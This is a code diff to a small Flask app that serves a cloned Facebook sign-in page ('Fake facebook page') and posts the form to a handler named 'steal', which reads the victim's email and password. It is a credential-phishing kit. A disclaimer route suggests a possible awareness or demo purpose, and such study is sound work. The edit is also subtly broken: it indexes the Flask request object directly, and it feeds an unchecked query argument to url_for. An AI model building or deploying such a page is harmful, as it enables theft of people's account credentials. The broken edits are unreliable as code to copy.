@@ -1,6 +1,6 @@
 """Our script for dynamic page serving."""
 
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, url_for
 import requests
 
 
@@ -23,7 +23,7 @@ def portals():
 @app.route("/disclaimers")
 def disclaimers():
     """Sign-in disclaimer."""
-    return render_template("disclaimers.html")
+    return render_template("disclaimers.html", routes_to=url_for(request.args["routes_to"]))
 
 
 @app.route("/signin")
@@ -31,10 +31,11 @@ def signin():
     """Fake facebook page."""
     return render_template("facebookClone.htm")
 
+
 @app.route("/signin", methods=["POST"])
 def steal():
     """Fake facebook page."""
-    email = request.form["email"]
-    password = request.form["pass"]
+    email = request["email"]
+    password = request["encpass"]
 
-    return redirect("facebookClone.htm")
+    return redirect(url_for("signin"))
